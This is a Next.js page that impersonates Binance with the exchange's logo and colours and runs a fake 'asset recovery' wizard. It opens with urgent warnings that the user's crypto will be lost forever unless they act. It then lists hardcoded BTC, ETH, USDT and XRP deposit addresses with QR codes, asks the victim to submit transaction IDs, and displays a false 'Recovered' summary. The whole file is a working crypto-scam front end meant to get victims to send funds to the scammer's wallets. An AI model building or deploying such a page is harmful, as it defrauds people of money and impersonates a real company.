"use client";

import { useState } from "react";
import {
  FaBars,
  FaTimes,
  FaBtc,
  FaEthereum,
  FaCheck,
} from "react-icons/fa";
import { SiTether } from "react-icons/si";
import { RiXrpFill } from "react-icons/ri";
import { BiMessageSquareError } from "react-icons/bi";
import { verifyTransaction } from "./actions";
import toast from "react-hot-toast";

interface VerificationStatus {
  verified: boolean;
  txId: string;
  error?: string;
  verifying?: boolean;
}

export default function Home() {
  const [currentStep, setCurrentStep] = useState(1);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const toggleMenu = () => setIsMenuOpen(!isMenuOpen);
  const [showQrModal, setShowQrModal] = useState(false);
  const [selectedQrImage, setSelectedQrImage] = useState("");
  const [anyVerified, setAnyVerified] = useState(false);
  const [transactionDetails, setTransactionDetails] = useState<{
    [key: string]: string;
  }>({});

  const wallets = [
    {
      name: "BTC Deposit",
      currency: "BTC",
      icon: <FaBtc />,
      address: "bc1qznj4v9p8z4kq3q8cw5hrw999rv3mv4e8gel5ak",
      imagePath: "Bitcoin.jpg",
      regex: /^[a-fA-F0-9]{64}$/,
    },
    {
      name: "ETH Deposit (eth network)",
      currency: "ETH",
      icon: <FaEthereum />,
      address: "0xaf779d3451c4d432c36C179FA043cC20f35F422A",
      imagePath: "Eth-eth.jpg",
      regex: /^0x[a-fA-F0-9]{64}$/,
    },
    {
      name: "USDT Deposit (eth network)",
      currency: "USDT",
      icon: <SiTether />,
      address: "0xaf779d3451c4d432c36C179FA043cC20f35F422A",
      imagePath: "USDT-eth.jpg",
      regex: /^0x[a-fA-F0-9]{64}$/,
    },
    // {
    //   name: "USDT (TRC-20)",
    //   currency: "USDT",
    //   icon: <SiTether />,
    //   address: "T...", // TRC-20 address
    //   imagePath: "download.png",
    //   regex: /^[a-fA-F0-9]{64}$/,
    // },
    // {
    //   name: "USDT (BEP-20)",
    //   currency: "USDT",
    //   icon: <SiTether />,
    //   address: "0x55d398326f99059fF775485246999027B3197955",
    //   imagePath: "download.png",
    //   regex: /^0x[a-fA-F0-9]{64}$/,
    // },
    {
      name: "XRP Deposit",
      currency: "XRP",
      icon: <RiXrpFill />,
      address: "rDBxA5zbKev6wsAz1PDeEF396qr664bvem",
      imagePath: "XRP.jpg",
      regex: /^[A-Fa-f0-9]{64}$/,
    },
  ];

  const [verifications, setVerifications] = useState<VerificationStatus[]>(
    wallets.map(() => ({ verified: false, txId: "" }))
  );

  const copyToClipboard = (address: string) => {
    navigator.clipboard.writeText(address);
    toast.success('Address copied to clipboard!');
  };

  const handleCheckTx = async (wallet: (typeof wallets)[number], index: number) => {
    const txId = verifications[index].txId;
    if (!txId) {
      toast.error("Please enter a transaction ID");
      return;
    }

    if (!wallet.regex.test(txId)) {
      toast.error(`Invalid TX ID format for ${wallet.currency}`);
      return;
    }

    const newVerifications = [...verifications];
    newVerifications[index].verifying = true;
    setVerifications(newVerifications);

    const loadingToast = toast.loading("Verifying transaction...");

    try {
      const result = await verifyTransaction({
        txId,
        currency: wallet.currency,
        address: wallet.address
      });

      const updatedVerifications = [...verifications];

      if (result.valid) {
        updatedVerifications[index] = {
          verified: true,
          txId,
          error: undefined,
          verifying: false
        };
        setAnyVerified(true);
        setTransactionDetails(prev => ({
          ...prev,
          [wallet.currency]: result.amount?.toString() || '0.00'
        }));
        toast.success(`Successfully verified ${result.amount} ${wallet.currency}!`, {
          id: loadingToast
        });
      } else {
        updatedVerifications[index] = {
          ...updatedVerifications[index],
          error: result.error || "Verification failed",
          verifying: false
        };
        toast.error(result.error || "Transaction verification failed", {
          id: loadingToast
        });
      }

      setVerifications(updatedVerifications);

    } catch (error) {
      const errorVerifications = [...verifications];
      errorVerifications[index].verifying = false;
      setVerifications(errorVerifications);
      toast.error("Verification failed. Please try again.", {
        id: loadingToast
      });
    }
  };

  return (
    <div className="bg-[#181a20] min-h-screen flex flex-col">
      <header className="bg-[#181a20] text-white py-4 px-8 shadow-lg shadow-black flex justify-between items-center fixed w-full z-10 top-0 left-0">
        <div className="flex items-center gap-6">
          <div className="text-2xl font-semibold flex items-center gap-2">
            <a
              style={{ width: "100px" }}
              className="logo-link"
              href="https://www.binance.com/en-GB/"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 5120 1024"
                className="header-logo"
                fill="#f2c118"
              >
                <path
                  d="M230.997333 512L116.053333 626.986667 0 512l116.010667-116.010667L230.997333 512zM512 230.997333l197.973333 197.973334 116.053334-115.968L512 0 197.973333 314.026667l116.053334 115.968L512 230.997333z m395.989333 164.992L793.002667 512l116.010666 116.010667L1024.981333 512l-116.992-116.010667zM512 793.002667l-197.973333-198.997334-116.053334 116.010667L512 1024l314.026667-314.026667-116.053334-115.968L512 793.002667z m0-165.973334l116.010667-116.053333L512 396.032 395.989333 512 512 626.986667z m1220.010667 11.946667v-1.962667c0-75.008-40.021333-113.024-105.002667-138.026666 39.978667-21.973333 73.984-58.026667 73.984-121.002667v-1.962667c0-88.021333-70.997333-145.024-185.002667-145.024h-260.992v561.024h267.008c126.976 0.981333 210.005333-51.029333 210.005334-153.002666z m-154.026667-239.957333c0 41.984-34.005333 58.965333-89.002667 58.965333h-113.962666V338.986667h121.984c52.010667 0 80.981333 20.992 80.981333 58.026666v2.005334z m31.018667 224c0 41.984-32.981333 61.013333-87.04 61.013333h-146.944v-123.050667h142.976c63.018667 0 91.008 23.04 91.008 61.013334v1.024z m381.994666 169.984V230.997333h-123.989333v561.024h123.989333v0.981334z m664.021334 0V230.997333h-122.026667v346.026667l-262.997333-346.026667h-114.005334v561.024h122.026667v-356.010666l272 356.992h104.96z m683.946666 0L3098.026667 228.010667h-113.962667l-241.024 564.992h127.018667l50.986666-125.994667h237.013334l50.986666 125.994667h130.005334z m-224.981333-235.008h-148.992l75.008-181.973334 73.984 181.973334z m814.037333 235.008V230.997333h-122.026666v346.026667l-262.997334-346.026667h-114.005333v561.024h122.026667v-356.010666l272 356.992h104.96z m636.970667-91.008l-78.976-78.976c-44.032 39.978667-83.029333 65.962667-148.010667 65.962666-96 0-162.986667-80-162.986666-176v-2.986666c0-96 67.968-174.976 162.986666-174.976 55.978667 0 100.010667 23.978667 144 62.976l78.976-91.008c-51.968-50.986667-114.986667-86.997333-220.970666-86.997334-171.989333 0-292.992 130.986667-292.992 290.005334V512c0 160.981333 122.965333 288.981333 288 288.981333 107.989333 1.024 171.989333-36.992 229.973333-98.986666z m527.018667 91.008v-109.994667h-305.024v-118.016h265.002666v-109.994667h-265.002666V340.992h301.013333V230.997333h-422.997333v561.024h427.008v0.981334z"
                  p-id="2935"
                ></path>
              </svg>
            </a>
          </div>

          {/* Desktop Navigation Links */}
          <nav className="space-x-6 hidden sm:flex">
            <a
              href="#"
              className="hover:text-[#f2c118] transition-colors duration-200"
            >
              Markets
            </a>
            <a
              href="#"
              className="hover:text-[#f2c118] transition-colors duration-200"
            >
              Trade
            </a>
            <a
              href="#"
              className="hover:text-[#f2c118] transition-colors duration-200"
            >
              Wallet
            </a>
            <a
              href="#"
              className="hover:text-[#f2c118] transition-colors duration-200"
            >
              Account
            </a>
          </nav>
        </div>

        {/* Right Side: Login and Sign Up */}
        <div className="space-x-6 hidden sm:flex">
          <a
            href="#"
            className="hover:text-[#f2c118] transition-colors duration-200"
          >
            Login
          </a>
          <a
            href="#"
            className="hover:text-[#f2c118] transition-colors duration-200"
          >
            Sign Up
          </a>
        </div>

        {/* Mobile Hamburger Menu */}
        <div className="sm:hidden flex items-center">
          <button onClick={toggleMenu}>
            {isMenuOpen ? (
              <FaTimes size={24} className="text-white" />
            ) : (
              <FaBars size={24} className="text-white" />
            )}
          </button>
        </div>
      </header>
      {/* Mobile Menu */}
      <div
        className={`sm:hidden fixed inset-0 bg-[#181a20] bg-opacity-90 transition-all ${isMenuOpen ? "block" : "hidden"
          }`}
      >
        <nav className="flex flex-col items-center space-y-6 pt-20">
          <a href="#" className="text-white text-xl hover:text-[#f2c118]">
            Markets
          </a>
          <a href="#" className="text-white text-xl hover:text-[#f2c118]">
            Trade
          </a>
          <a href="#" className="text-white text-xl hover:text-[#f2c118]">
            Wallet
          </a>
          <a href="#" className="text-white text-xl hover:text-[#f2c118]">
            Account
          </a>
          <a href="#" className="text-white text-xl hover:text-[#f2c118]">
            Login
          </a>
          <a href="#" className="text-white text-xl hover:text-[#f2c118]">
            Sign Up
          </a>
        </nav>
      </div>

      {/* Main Content */}
      <div className="flex items-center justify-center min-h-screen pt-20 p-8">
        <div className="w-full max-w-lg p-8 rounded-xl bg-[#181a20] shadow-xl transition-all duration-300 transform">
          {currentStep === 1 && (
            <div className="animate-slide-up">
              <h2 className="text-2xl text-white font-semibold mb-6">
                Welcome!
              </h2>
              <div>
                <p className="text-md text-white mb-2">
                  🚨 Security Notification: Immediate Action Required! 🚨
                  <br></br>
                  <br></br>
                  ⚠️ Important: Recover Your Crypto Assets Now! ⚠️
                  <br></br>
                  <br></br>
                  You are currently in the asset recovery process. If you do not
                  complete all the required steps in this wizard, your crypto
                  assets will be permanently lost and cannot be recovered later.
                  <br></br>
                  <br></br>✅ Follow the instructions carefully to ensure your
                  funds are safely restored.
                  <br></br>
                  <br></br>
                  🚀 Take action now—this is your only chance to recover your
                  assets!
                  <br></br>
                  <br></br>
                  🔒 For security reasons, once this process is exited or
                  skipped, recovery will no longer be possible.
                  <br></br>
                  <br></br>
                  ⚠️ Failure to complete this process means your assets will be
                  lost forever.
                  <br></br>
                  <br></br>
                  👉 Click "Next" to continue and secure your funds.
                </p>
              </div>
              <button
                onClick={() => setCurrentStep(2)}
                className="w-full bg-[#f2c118] text-black p-3 rounded-lg hover:bg-[#d1a10f] transition-colors mt-4"
              >
                Next
              </button>
            </div>
          )}

          {currentStep === 2 && (
            <div className="animate-slide-up">
              <h2 className="text-2xl text-white font-semibold mb-6">
                Select Wallet
              </h2>
              <div className="space-y-4">
                {wallets.map((wallet) => (
                  <div
                    key={wallet.name}
                    className="grid grid-cols-12 items-center"
                  >
                    <div
                      onClick={() => copyToClipboard(wallet.address)}
                      className="col-span-10 flex items-center p-3 rounded-lg bg-[#2b2f36] hover:bg-[#3d424a] cursor-pointer transition-colors"
                    >
                      <span className="text-[#f2c118] ml-2 mr-3 text-3xl">
                        {wallet.icon}
                      </span>
                      <div className="inline-grid">
                        <h4 className="text-white font-medium">
                          {wallet.name}
                        </h4>
                        <p className="text-sm text-gray-400 truncate">
                          {wallet.address}
                        </p>
                      </div>
                    </div>
                    <div
                      className="col-span-2 ml-2 cursor-pointer"
                      onClick={() => {
                        setSelectedQrImage(wallet.imagePath);
                        setShowQrModal(true);
                      }}
                    >
                      <img
                        src={wallet.imagePath}
                        alt="QR Code"
                        className="object-contain hover:scale-110 transition-transform"
                      />
                    </div>
                  </div>
                ))}
                <button
                  onClick={() => setCurrentStep(3)}
                  className="w-full bg-[#f2c118] text-black p-3 rounded-lg hover:bg-[#d1a10f] transition-colors mt-6"
                >
                  Next
                </button>
              </div>
            </div>
          )}

          {currentStep === 3 && (
            <div className="animate-slide-up">
              <h2 className="text-2xl text-white font-semibold mb-6">
                Verify Transactions
              </h2>
              <div className="space-y-6">
                {wallets.map((wallet, index) => (
                  <div key={wallet.name} className="relative group">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-[#f2c118] text-xl">
                        {wallet.icon}
                      </span>
                      <h5 className="text-sm text-white">{wallet.name}</h5>
                    </div>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        value={verifications[index].txId}
                        onChange={(e) => {
                          const newVerifications = [...verifications];
                          newVerifications[index].txId = e.target.value;
                          newVerifications[index].verified = false;
                          setVerifications(newVerifications);
                        }}
                        className={`w-full p-3 rounded-md text-white border ${verifications[index].verified
                          ? "border-green-500 bg-green-900/20"
                          : "border-[#666] bg-[#181a20]"
                          } focus:outline-none focus:ring-1 focus:ring-[#f2c118]`}
                        placeholder="Enter transaction ID"
                        disabled={verifications[index].verified}
                      />
                      <button
                        type="button"
                        onClick={async () => {
                          await handleCheckTx(wallet, index);
                        }}
                        className={`px-4 rounded-md transition-colors ${verifications[index].verified
                          ? "bg-green-500 hover:bg-green-600"
                          : "bg-[#f2c118] hover:bg-[#d1a10f]"
                          }`}
                        disabled={verifications[index].verified || verifications[index].verifying}
                      >
                        {verifications[index].verifying ? (
                          <span className="animate-pulse">Verifying...</span>
                        ) : verifications[index].verified ? (
                          <FaCheck className="text-white" />
                        ) : (
                          "Verify"
                        )}
                      </button>
                    </div>
                    {verifications[index].error &&
                      !verifications[index].verified && (
                        <div className="text-red-500 text-sm mt-1 flex items-center gap-1">
                          <BiMessageSquareError />
                          {verifications[index].error}
                        </div>
                      )}
                  </div>
                ))}

                <button
                  onClick={() => setCurrentStep(4)}
                  disabled={!anyVerified}
                  className={`w-full p-3 rounded-lg transition-colors ${anyVerified
                    ? "bg-[#f2c118] hover:bg-[#d1a10f] text-black"
                    : "bg-gray-600 cursor-not-allowed text-gray-400"
                    }`}
                >
                  {anyVerified ? "Next" : "At least one transaction required"}
                </button>
              </div>
            </div>
          )}

          {currentStep === 4 && (
            <div className="animate-slide-up">
              <h2 className="text-2xl text-white font-semibold mb-6">
                Recovery Summary
              </h2>
              <div className="space-y-4">
                {wallets.map((wallet, index) => (
                  <div
                    key={wallet.name}
                    className="p-4 rounded-lg bg-[#2b2f36]"
                  >
                    <div className="flex items-center gap-3 mb-2">
                      <span className="text-[#f2c118] text-xl">
                        {wallet.icon}
                      </span>
                      <h3 className="text-white font-medium">{wallet.name}</h3>
                    </div>
                    {verifications[index].verified ? (
                      <div className="flex items-center gap-2 text-green-400">
                        <FaCheck />
                        <span>
                          Success! Recovered {transactionDetails[wallet.currency]} {wallet.currency}
                        </span>
                      </div>
                    ) : (
                      <div className="flex items-center gap-2 text-red-400">
                        <BiMessageSquareError />
                        <span>No transaction verified for this wallet</span>
                      </div>
                    )}
                  </div>
                ))}
                <button
                  onClick={() => setCurrentStep(5)}
                  className="w-full bg-[#f2c118] text-black p-3 rounded-lg hover:bg-[#d1a10f] transition-colors mt-6"
                >
                  Continue
                </button>
              </div>
            </div>
          )}

          {currentStep === 5 && (
            <div className="animate-slide-up text-center">
              <h2 className="text-2xl text-white font-semibold mb-4">
                Thank You!
              </h2>
              <p className="text-gray-300">
                Your transaction has been processed successfully. We'll contact
                you shortly.
              </p>
              <div className="mt-8 text-[#f2c118] flex justify-center">
                <FaCheck className="text-4xl animate-bounce" />
              </div>
            </div>
          )}
        </div>
      </div>

      {showQrModal && (
        <div
          className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50"
          onClick={() => {
            setShowQrModal(false);
            setSelectedQrImage("");
          }}
        >
          <div className="bg-[#2b2f36] p-8 rounded-xl max-w-90vw max-h-90vh">
            <img
              src={selectedQrImage}
              alt="Full Size QR Code"
              className="w-64 h-64 object-contain mx-auto"
            />
            <p className="text-white text-center mt-4 text-sm">
              Click anywhere to close
            </p>
          </div>
        </div>
      )}
    </div>
  );
}
